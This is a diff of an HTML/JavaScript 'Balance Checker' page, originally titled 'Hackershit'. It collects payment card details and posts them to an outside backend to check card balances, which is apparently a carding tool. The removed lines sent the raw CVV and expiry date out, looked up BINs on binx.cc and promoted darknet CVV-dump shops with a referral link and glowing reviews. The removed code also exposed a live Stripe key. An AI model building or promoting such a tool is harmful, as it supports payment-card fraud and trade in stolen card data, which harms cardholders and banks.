@@ -3,8 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Hackershit</title>
-    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&display=swap" rel="stylesheet">
+    <title>Balance Checker</title>
     <script src="https://js.stripe.com/v3/"></script>
     <style>
         body {
@@ -60,27 +59,14 @@
             box-shadow: 0 0 30px #00ff88, inset 0 0 30px rgba(138, 43, 226, 0.5);
             border: 2px solid #8a2be2;
         }
-        input[type="text"] {
-            width: 100%;
-            padding: 10px;
-            margin: 10px 0;
-            border: 1px solid #00ff88;
-            border-radius: 5px;
-            background: #000;
-            color: #00ff88;
-            font-family: 'Orbitron', sans-serif;
-            box-shadow: 0 0 10px #8a2be2;
-        }
-        input[type="text"]:focus {
-            outline: none;
-            box-shadow: 0 0 20px #00ff88;
-        }
         #card-element {
             padding: 10px;
             border: 1px solid #00ff88;
             border-radius: 5px;
             background: #000;
             color: #00ff88;
+            width: 100%;
+            margin: 10px 0;
         }
         input[type="submit"] {
             width: 100%;
@@ -132,14 +118,12 @@
 <body>
     <h1>Balance Checker</h1>
     <form id="balanceForm">
-        Card Number: <div id="card-element"></div>
-        Exp (MM/YY): <input type="text" id="exp" name="exp" required><br>
-        CVV: <input type="text" id="cvv" name="cvv" required><br>
+        Card Info: <div id="card-element"></div>
         <input type="submit" value="Check Balance">
     </form>
     <div id="result"></div>
     <script>
-        const stripe = Stripe('pk_live_51RyFQw3xHLWv8lmEAOHH59LVElWtham2vZdh5onQjjgthirQRut6PmKzSCYxc0w0upWSbzKJyLFJ9bdmnG122siA00D0Nnt7hO'); // Replace with your Stripe publishable key (pk_live_... for production)
+        const stripe = Stripe('pk_test_...'); // Replace with your Stripe publishable key
         const elements = stripe.elements();
         const cardElement = elements.create('card', {
             style: {
@@ -155,99 +139,33 @@
         });
         cardElement.mount('#card-element');
 
-        // Custom logic: Format expiry
-        document.getElementById('exp').addEventListener('input', function(e) {
-            let value = e.target.value.replace(/\D/g, '');
-            if (value.length > 2) {
-                value = value.slice(0, 2) + '/' + value.slice(2, 4);
-            }
-            e.target.value = value;
-        });
-
-        // Custom logic: Limit CVV
-        document.getElementById('cvv').addEventListener('input', function(e) {
-            e.target.value = e.target.value.replace(/\D/g, '').slice(0, 4);
-        });
-
-        // Custom logic: BIN fetch and darknet insight
-        async function fetchBinDetails(bin) {
-            try {
-                const response = await fetch(`https://binx.cc/bin/${bin}`);
-                if (response.ok) {
-                    const text = await response.text();
-                    const title = text.match(/<title>(.*?)<\/title>/)?.[1] || 'Details on BinX';
-                    return title;
-                }
-            } catch (err) {
-                return 'Fetch failed';
-            }
-            return 'Unknown BIN';
-        }
-
-        function getDarknetInsight(bin, balance) {
-            const darknetShops = {
-                'RoseCC (CVV)': { url: 'https://www.rosecc.pw/signup?referral=BinXXX', review: 'Highly reliable with instant CVV dumps and excellent community reviews on BinX.cc. Best for fresh high-limit cards.' },
-                'Qyzet (CVV)': { url: 'https://t.me/qyzetbot', review: 'Telegram bot with stellar reviews for quick CVV checks and dumps. Essential for real-time validation.' }
-            };
-            if (bin.startsWith('4')) {
-                return `Check ${darknetShops['RoseCC (CVV)'].url} - ${darknetShops['RoseCC (CVV)'].review}`;
-            } else {
-                return `For this BIN, try ${darknetShops['Qyzet (CVV)'].url} - ${darknetShops['Qyzet (CVV)'].review}`;
-            }
-        }
-
-        // Custom logic: Form submission with Stripe tokenization
+        // Form submission
         document.getElementById('balanceForm').addEventListener('submit', async function(e) {
             e.preventDefault();
-            const exp = document.getElementById('exp').value;
-            const cvv = document.getElementById('cvv').value;
             const resultDiv = document.getElementById('result');
 
-            // Custom validation
-            if (!/^\d{2}\/\d{2}$/.test(exp)) {
-                resultDiv.innerText = 'Error: Invalid exp format (MM/YY)';
-                resultDiv.className = 'show';
-                return;
-            }
-            if (!/^\d{3,4}$/.test(cvv)) {
-                resultDiv.innerText = 'Error: Invalid CVV';
-                resultDiv.className = 'show';
-                return;
-            }
-
-            // Custom loading state
+            // Loading state
             resultDiv.innerHTML = '<div class="loading"></div> Checking balance...';
             resultDiv.className = 'show';
 
-            // Tokenize card with Stripe
+            // Tokenize card
             const { token, error } = await stripe.createToken(cardElement);
             if (error) {
                 resultDiv.innerText = `Error: ${error.message}`;
                 return;
             }
 
-            const bin = token.card.id.substring(0, 6); // Approximate BIN from token
-            const binInfo = await fetchBinDetails(bin);
-
             try {
                 const response = await fetch('https://hackershit-production.up.railway.app', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
-                        token: token.id,
-                        exp: exp,
-                        cvv: cvv
+                        token: token.id
                     })
                 });
 
                 const data = await response.json();
-                const darknetInsight = getDarknetInsight(bin, data.balance);
-                resultDiv.innerHTML = `
-                    BIN ${bin}: ${binInfo}<br>
-                    <a href="https://binx.cc/bin/${bin}" target="_blank" style="color: #00ff88;">Check BIN on BinX</a><br>
-                    Balance: ${data.balance}<br>
-                    Darknet Insight: ${darknetInsight}
-                `;
+                resultDiv.innerText = `Balance: ${data.balance}`;
             } catch (error) {
                 resultDiv.innerText = 'Error: Network issue';
             }
